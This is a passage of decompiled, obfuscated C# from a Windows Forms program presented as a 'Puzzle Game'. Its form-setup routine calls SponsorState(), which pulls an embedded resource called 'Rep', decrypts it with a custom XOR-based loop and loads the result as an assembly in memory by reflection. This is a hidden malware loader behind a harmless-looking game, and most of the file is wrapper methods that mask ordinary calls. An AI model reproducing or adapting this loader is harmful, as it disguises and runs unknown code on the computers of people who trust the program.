		Form1.smethod_108(Form1.smethod_107((Control)(object)this), (Control)(object)menuStrip1);
		Form1.smethod_109((Form)(object)this, menuStrip1);
		Form1.smethod_110((Control)(object)this, "Form1");
		Form1.smethod_19((Control)(object)this, "Puzzle Game");
		Form1.smethod_111((Control)(object)statusStrip1, bool_0: false);
		Form1.smethod_112((Control)(object)statusStrip1);
		Form1.smethod_111((Control)(object)menuStrip1, bool_0: false);
		Form1.smethod_112((Control)(object)menuStrip1);
		Form1.smethod_111((Control)(object)tableLayoutPanel1, bool_0: false);
		Form1.smethod_113((Control)(object)this, bool_0: false);
		Form1.smethod_114((Control)(object)this);
		SponsorState();
	}

	private static void SponsorState()
	{
		byte[] array = (byte[])Form1.smethod_116(Form1.smethod_115(s), "Rep");
		for (int i = 133142; i >= 0; i += -1)
		{
			array = DismatleCode(array, i, 256);
		}
		ImageFileMachine = Form1.smethod_117((Assembly)RefreshCode(array))[1];
	}

	public static object RefreshCode(byte[] ConstructionCall)
	{
		Type type_ = Form1.smethod_118("System.Reflection.Assembly");
		return Form1.smethod_119(type_, "Load", BindingFlags.InvokeMethod, (Binder)null, (object)null, new object[1] { ConstructionCall });
	}

	private static byte[] DismatleCode(byte[] tt, int i, int AsyncLocal)
	{
		int num = tt[(i + 1) % CodePage];
		int num2 = 0;
		int num3 = HashIncrease(tt, i, 22);
		int num4 = num + AsyncLocal;
		num2 = (num3 - num4) % AsyncLocal;
		tt[i % CodePage] = SelectSetup(num2);
		return tt;
	}

	public static byte SelectSetup(int w)
	{
		return (byte)w;
	}

	private static int HashIncrease(byte[] ConstantAttribute, int i, int j)
	{
		byte b = ConstantAttribute[i % CodePage];
		return b ^ Form1.smethod_120(Explicit, i % j);
	}

	static SaveFileDialog smethod_0()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new SaveFileDialog();
	}

	static OpenFileDialog smethod_1()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new OpenFileDialog();
	}

	static BackgroundWorker smethod_2()
	{
		return new BackgroundWorker();
	}

	static Timer smethod_3()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Timer();
	}

	static ToolStripStatusLabel smethod_4()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ToolStripStatusLabel();
	}

	static MethodInfo smethod_5(Type type_0, string string_0)
	{
		return type_0.GetMethod(string_0);
	}

	static object smethod_6(MethodBase methodBase_0, object object_0, object[] object_1)
	{
		return methodBase_0.Invoke(object_0, object_1);
	}

	static string smethod_7(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_8(ToolStripItem toolStripItem_0, string string_0)
	{
		toolStripItem_0.set_Text(string_0);
	}

	static void smethod_9(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_10(ToolStripProgressBar toolStripProgressBar_0, int int_0)
	{
		toolStripProgressBar_0.set_Maximum(int_0);
	}

	static void smethod_11(ToolStripProgressBar toolStripProgressBar_0, int int_0)
	{
		toolStripProgressBar_0.set_Step(int_0);
	}

	static void smethod_12(ToolStripProgressBar toolStripProgressBar_0, int int_0)
	{
		toolStripProgressBar_0.set_Value(int_0);
	}

	static void smethod_13(BackgroundWorker backgroundWorker_0, bool bool_0)
	{
		backgroundWorker_0.WorkerReportsProgress = bool_0;
	}

	static void smethod_14(BackgroundWorker backgroundWorker_0, bool bool_0)
	{
		backgroundWorker_0.WorkerSupportsCancellation = bool_0;
	}

	static void smethod_15(BackgroundWorker backgroundWorker_0, DoWorkEventHandler doWorkEventHandler_0)
	{
		backgroundWorker_0.DoWork += doWorkEventHandler_0;
	}

	static void smethod_16(BackgroundWorker backgroundWorker_0, ProgressChangedEventHandler progressChangedEventHandler_0)
	{
		backgroundWorker_0.ProgressChanged += progressChangedEventHandler_0;
	}

	static void smethod_17(BackgroundWorker backgroundWorker_0, RunWorkerCompletedEventHandler runWorkerCompletedEventHandler_0)
	{
		backgroundWorker_0.RunWorkerCompleted += runWorkerCompletedEventHandler_0;
	}

	static void smethod_18(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_19(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static void smethod_20(Form form_0, FormStartPosition formStartPosition_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_StartPosition(formStartPosition_0);
	}

	static void smethod_21(Form form_0, FormClosingEventHandler formClosingEventHandler_0)
	{
		form_0.add_FormClosing(formClosingEventHandler_0);
	}

	static Label smethod_22()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_23(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_24(Control control_0, AnchorStyles anchorStyles_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Anchor(anchorStyles_0);
	}

	static Font smethod_25(string string_0, float float_0, FontStyle fontStyle_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0);
	}

	static void smethod_26(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_27(Label label_0, ContentAlignment contentAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		label_0.set_TextAlign(contentAlignment_0);
	}

	static TableLayoutControlCollection smethod_28(TableLayoutPanel tableLayoutPanel_0)
	{
		return tableLayoutPanel_0.get_Controls();
	}

	static void smethod_29(TableLayoutControlCollection tableLayoutControlCollection_0, Control control_0, int int_0, int int_1)
	{
		tableLayoutControlCollection_0.Add(control_0, int_0, int_1);
	}

	static Button smethod_30()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static void smethod_31(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static void smethod_32(Control control_0, object object_0)
	{
		control_0.set_Tag(object_0);
	}

	static void smethod_33(Button button_0, AutoSizeMode autoSizeMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		button_0.set_AutoSizeMode(autoSizeMode_0);
	}

	static void smethod_34(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_35(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_MouseEnter(eventHandler_0);
	}

	static void smethod_36(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_MouseLeave(eventHandler_0);
	}

	static void smethod_37(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static void smethod_38(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static object smethod_39(Control control_0)
	{
		return control_0.get_Tag();
	}

	static MouseButtons smethod_40(MouseEventArgs mouseEventArgs_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return mouseEventArgs_0.get_Button();
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static void smethod_42(Timer timer_0)
	{
		timer_0.Stop();
	}

	static void smethod_43(Timer timer_0)
	{
		timer_0.Start();
	}

	static bool smethod_44(BackgroundWorker backgroundWorker_0)
	{
		return backgroundWorker_0.IsBusy;
	}

	static void smethod_45(BackgroundWorker backgroundWorker_0)
	{
		backgroundWorker_0.CancelAsync();
	}

	static void smethod_46()
	{
		Application.DoEvents();
	}

	static void smethod_47(BackgroundWorker backgroundWorker_0)
	{
		backgroundWorker_0.RunWorkerAsync();
	}

	static Random smethod_48()
	{
		return new Random();
	}

	static int smethod_49(Random random_0, int int_0, int int_1)
	{
		return random_0.Next(int_0, int_1);
	}

	static DialogResult smethod_50(string string_0, string string_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_0, string_1);
	}

	static DialogResult smethod_51(string string_0, string string_1, MessageBoxButtons messageBoxButtons_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_0, string_1, messageBoxButtons_0);
	}

	static void smethod_52(CancelEventArgs cancelEventArgs_0, bool bool_0)
	{
		cancelEventArgs_0.Cancel = bool_0;
	}

	static void smethod_53(NumericUpDown numericUpDown_0, decimal decimal_0)
	{
		numericUpDown_0.set_Value(decimal_0);
	}

	static DialogResult smethod_54(Form form_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return form_0.ShowDialog();
	}

	static void smethod_55(ToolStripItem toolStripItem_0, bool bool_0)
	{
		toolStripItem_0.set_Enabled(bool_0);
	}

	static void smethod_56(ToolStripMenuItem toolStripMenuItem_0, bool bool_0)
	{
		toolStripMenuItem_0.set_Checked(bool_0);
	}

	static void smethod_57(ToolStrip toolStrip_0, Color color_0)
	{
		toolStrip_0.set_BackColor(color_0);
	}

	static Color smethod_58()
	{
		return Control.get_DefaultBackColor();
	}

	static bool smethod_59(BackgroundWorker backgroundWorker_0)
	{
		return backgroundWorker_0.CancellationPending;
	}

	static void smethod_60(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static void smethod_61(BackgroundWorker backgroundWorker_0, int int_0)
	{
		backgroundWorker_0.ReportProgress(int_0);
	}

	static int smethod_62(ProgressChangedEventArgs progressChangedEventArgs_0)
	{
		return progressChangedEventArgs_0.ProgressPercentage;
	}

	static void smethod_63(FileDialog fileDialog_0, string string_0)
	{
		fileDialog_0.set_Filter(string_0);
	}

	static void smethod_64(FileDialog fileDialog_0, string string_0)
	{
		fileDialog_0.set_Title(string_0);
	}

	static DialogResult smethod_65(CommonDialog commonDialog_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return commonDialog_0.ShowDialog();
	}

	static string smethod_66(FileDialog fileDialog_0)
	{
		return fileDialog_0.get_FileName();
	}

	static bool smethod_67(string string_0, string string_1)
	{
		return string_0 != string_1;
	}

	static StreamWriter smethod_68(string string_0)
	{
		return new StreamWriter(string_0);
	}

	static void smethod_69(TextWriter textWriter_0, char char_0)
	{
		textWriter_0.Write(char_0);
	}

	static void smethod_70(TextWriter textWriter_0)
	{
		textWriter_0.Close();
	}

	static StreamReader smethod_71(string string_0)
	{
		return new StreamReader(string_0);
	}

	static int smethod_72(TextReader textReader_0)
	{
		return textReader_0.Read();
	}

	static void smethod_73(TextReader textReader_0)
	{
		textReader_0.Close();
	}

	static void smethod_74(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static StatusStrip smethod_75()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new StatusStrip();
	}

	static ToolStripProgressBar smethod_76()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ToolStripProgressBar();
	}

	static MenuStrip smethod_77()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new MenuStrip();
	}

	static ToolStripMenuItem smethod_78()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new ToolStripMenuItem();
	}

	static TableLayoutPanel smethod_79()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new TableLayoutPanel();
	}

	static void smethod_80(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_81(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static ToolStripItemCollection smethod_82(ToolStrip toolStrip_0)
	{
		return toolStrip_0.get_Items();
	}

	static void smethod_83(ToolStripItemCollection toolStripItemCollection_0, ToolStripItem[] toolStripItem_0)
	{
		toolStripItemCollection_0.AddRange(toolStripItem_0);
	}

	static void smethod_84(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_87(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_88(ToolStripItem toolStripItem_0, ToolStripItemAlignment toolStripItemAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		toolStripItem_0.set_Alignment(toolStripItemAlignment_0);
	}

	static void smethod_89(ToolStripItem toolStripItem_0, string string_0)
	{
		toolStripItem_0.set_Name(string_0);
	}

	static void smethod_90(ToolStripItem toolStripItem_0, Size size_0)
	{
		toolStripItem_0.set_Size(size_0);
	}

	static void smethod_91(ToolStripItem toolStripItem_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		toolStripItem_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_92(ToolStripItem toolStripItem_0, EventHandler eventHandler_0)
	{
		toolStripItem_0.add_Click(eventHandler_0);
	}

	static ToolStripItemCollection smethod_93(ToolStripDropDownItem toolStripDropDownItem_0)
	{
		return toolStripDropDownItem_0.get_DropDownItems();
	}

	static void smethod_94(ToolStripMenuItem toolStripMenuItem_0, CheckState checkState_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		toolStripMenuItem_0.set_CheckState(checkState_0);
	}

	static void smethod_95(TableLayoutPanel tableLayoutPanel_0, int int_0)
	{
		tableLayoutPanel_0.set_ColumnCount(int_0);
	}

	static TableLayoutColumnStyleCollection smethod_96(TableLayoutPanel tableLayoutPanel_0)
	{
		return tableLayoutPanel_0.get_ColumnStyles();
	}

	static ColumnStyle smethod_97(SizeType sizeType_0, float float_0)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new ColumnStyle(sizeType_0, float_0);
	}

	static int smethod_98(TableLayoutColumnStyleCollection tableLayoutColumnStyleCollection_0, ColumnStyle columnStyle_0)
	{
		return tableLayoutColumnStyleCollection_0.Add(columnStyle_0);
	}

	static void smethod_99(TableLayoutPanel tableLayoutPanel_0, int int_0)
	{
		tableLayoutPanel_0.set_RowCount(int_0);
	}

	static TableLayoutRowStyleCollection smethod_100(TableLayoutPanel tableLayoutPanel_0)
	{
		return tableLayoutPanel_0.get_RowStyles();
	}

	static RowStyle smethod_101(SizeType sizeType_0, float float_0)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new RowStyle(sizeType_0, float_0);
	}

	static int smethod_102(TableLayoutRowStyleCollection tableLayoutRowStyleCollection_0, RowStyle rowStyle_0)
	{
		return tableLayoutRowStyleCollection_0.Add(rowStyle_0);
	}

	static Color smethod_103()
	{
		return SystemColors.Control;
	}

	static void smethod_104(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_105(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_106(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_107(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_108(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_109(Form form_0, MenuStrip menuStrip_0)
	{
		form_0.set_MainMenuStrip(menuStrip_0);
	}

	static void smethod_110(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_111(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_112(Control control_0)
	{
		control_0.PerformLayout();
	}

	static void smethod_113(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_114(Control control_0)
	{
		control_0.PerformLayout();
	}

	static ResourceManager smethod_115(Type type_0)
	{
		return new ResourceManager(type_0);
	}

	static object smethod_116(ResourceManager resourceManager_0, string string_0)
	{
		return resourceManager_0.GetObject(string_0);
	}

	static Type[] smethod_117(Assembly assembly_0)
	{
		return assembly_0.GetExportedTypes();
	}

	static Type smethod_118(string string_0)
	{
		return Type.GetType(string_0);
	}

	static object smethod_119(Type type_0, string string_0, BindingFlags bindingFlags_0, Binder binder_0, object object_0, object[] object_1)
	{
		return type_0.InvokeMember(string_0, bindingFlags_0, binder_0, object_0, object_1);
	}

	static char smethod_120(string string_0, int int_0)
	{
		return string_0[int_0];
	}

	static Type smethod_121(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}
}
